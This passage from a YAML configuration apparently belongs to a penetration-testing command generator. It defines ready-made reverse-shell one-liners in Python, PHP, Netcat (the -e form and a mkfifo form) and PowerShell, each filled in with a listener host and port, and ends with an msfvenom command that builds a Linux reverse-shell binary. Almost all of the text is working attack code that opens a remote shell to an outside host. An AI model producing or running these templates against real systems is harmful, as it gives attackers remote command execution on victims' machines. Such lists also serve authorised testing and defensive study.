        params:
          - lhost
          - lport

      python_reverse:
        name: "Python - Reverse Shell"
        description: "Generate Python reverse shell one-liner"
        command: "echo 'python3 -c '\\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\\'''"
        params:
          - lhost
          - lport

      php_reverse:
        name: "PHP - Reverse Shell"
        description: "Generate PHP reverse shell command"
        command: "echo 'php -r '\\''$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\\'''"
        params:
          - lhost
          - lport

      nc_reverse:
        name: "Netcat - Reverse Shell"
        description: "Generate Netcat reverse shell (-e version)"
        command: "echo 'nc {lhost} {lport} -e /bin/bash'"
        params:
          - lhost
          - lport

      nc_mkfifo:
        name: "Netcat FIFO - Reverse Shell"
        description: "Netcat reverse shell without -e flag"
        command: "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'"
        params:
          - lhost
          - lport

      powershell_reverse:
        name: "PowerShell - Reverse Shell"
        description: "Generate PowerShell reverse shell"
        command: "echo 'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('\"'{lhost}'\"',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '\"'PS '\"' + (pwd).Path + '\"'> '\"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"'"
        params:
          - lhost
          - lport

      msfvenom_linux:
        name: "Msfvenom - Linux ELF"
        description: "Generate Linux reverse shell binary"
        command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
        params:
